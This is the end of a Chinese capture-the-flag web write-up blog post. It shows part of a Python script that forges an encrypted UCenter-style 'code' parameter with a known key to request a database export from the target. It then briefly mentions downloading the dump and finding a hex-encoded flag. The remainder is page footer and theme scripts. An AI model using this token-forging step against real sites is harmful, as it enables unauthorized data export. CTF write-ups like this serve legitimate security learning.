</span></span><span class="line"><span class="ln">57</span><span class="cl">
</span></span><span class="line"><span class="ln">58</span><span class="cl">
</span></span><span class="line"><span class="ln">59</span><span class="cl"><span class="k">def</span> <span class="nf">build_code</span><span class="p">(</span><span class="n">params</span><span class="p">:</span> <span class="nb">dict</span><span class="p">,</span> <span class="n">expiry</span><span class="o">=</span><span class="mi">3600</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">60</span><span class="cl">    <span class="c1"># 构造 query string</span>
</span></span><span class="line"><span class="ln">61</span><span class="cl">    <span class="n">query</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">urlencode</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">doseq</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">62</span><span class="cl">    <span class="k">return</span> <span class="n">authcode</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="s1">&#39;ENCODE&#39;</span><span class="p">,</span> <span class="n">UC_KEY</span><span class="p">,</span> <span class="n">expiry</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">63</span><span class="cl">
</span></span><span class="line"><span class="ln">64</span><span class="cl">
</span></span><span class="line"><span class="ln">65</span><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">66</span><span class="cl">    <span class="c1"># 构造 payload</span>
</span></span><span class="line"><span class="ln">67</span><span class="cl">    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">68</span><span class="cl">        <span class="s2">&#34;method&#34;</span><span class="p">:</span> <span class="s2">&#34;export&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="ln">69</span><span class="cl">        <span class="s2">&#34;time&#34;</span><span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
</span></span><span class="line"><span class="ln">70</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">71</span><span class="cl">
</span></span><span class="line"><span class="ln">72</span><span class="cl">    <span class="c1"># 生成 code，有效期 1 小时</span>
</span></span><span class="line"><span class="ln">73</span><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="n">build_code</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">expiry</span><span class="o">=</span><span class="mi">3600</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">74</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] code =&#34;</span><span class="p">,</span> <span class="n">code</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">75</span><span class="cl">
</span></span><span class="line"><span class="ln">76</span><span class="cl">    <span class="c1"># 拼接最终 URL</span>
</span></span><span class="line"><span class="ln">77</span><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">TARGET</span><span class="si">}</span><span class="s2">code=</span><span class="si">{</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">code</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="ln">78</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Final URL:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
</span></span></code></pre></div><p>下载导出的数据库</p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-21.png"></p>
<p><img alt="img" loading="lazy" src="../assets/1755430984426-22.png"></p>
<p>找到hex的flag</p>
<p><img alt="image-20250818185157399" loading="lazy" src="../assets/image-20250818185157399.png"></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://blog.xrntkk.top/tags/writeup/">Writeup</a></li>
      <li><a href="https://blog.xrntkk.top/tags/ctf/">Ctf</a></li>
      <li><a href="https://blog.xrntkk.top/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://blog.xrntkk.top/post/ycb2025-record/">
    <span class="title">« 上一页</span>
    <br>
    <span>羊城杯2025 金Java&amp;ezsigin Writeup</span>
  </a>
  <a class="next" href="https://blog.xrntkk.top/post/hnctf_2025/">
    <span class="title">下一页 »</span>
    <br>
    <span>H&amp;NCTF-2025-Web-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
    <span id="busuanzi_container_site_pv">
        Total Visits: <span id="busuanzi_value_site_pv"></span> & 
    </span>
    <span id="busuanzi_container_site_uv">
        Unique Visitor: <span id="busuanzi_value_site_uv"></span>
    </span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
